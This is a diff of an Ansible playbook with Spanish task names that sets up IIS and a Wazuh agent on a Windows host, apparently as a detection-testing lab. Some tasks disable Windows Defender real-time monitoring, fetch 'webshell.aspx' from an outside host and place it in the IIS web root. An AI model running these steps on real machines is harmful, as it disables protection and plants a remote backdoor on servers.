@@ -2,7 +2,6 @@
 - name: Instalar IIS
   hosts: Windows-Agente
   gather_facts: false
-  #become: true
   tasks:
     - name: Instalar IIS y características requeridas
       win_feature:
@@ -85,16 +84,19 @@
         src: ./scripts_ansible/configurar_agente.ps1
         dest: 'C:\Temp\configurar_agente.ps1'
 
+    - name: Ejecutar script de configuración en la máquina remota
+      win_shell: 'powershell.exe -ExecutionPolicy Bypass -File C:\Temp\configurar_agente.ps1'
+
     - name: Reiniciar agente Wazuh
       win_service:
         name: wazuh
         state: restarted
 
-    - name: Disable Windows Defender Real-time Monitoring
+    - name: Desactivar la monitorización en tiempo real de Windows Defender
       win_shell: Set-MpPreference -DisableRealtimeMonitoring $true
 
-    - name: Download webshell.aspx
+    - name: Descargar webshell.aspx
       win_shell: Invoke-WebRequest -OutFile 'C:\Users\Public\Downloads\webshell.aspx' -Uri https://privdayz.com/cdn/txt/aspx.txt
 
-    - name: Copy webshell.aspx to wwwroot
+    - name: Copiar webshell.aspx al directorio wwwroot
       win_shell: copy 'C:\Users\Public\Downloads\webshell.aspx' 'C:\inetpub\wwwroot\webshell.aspx'
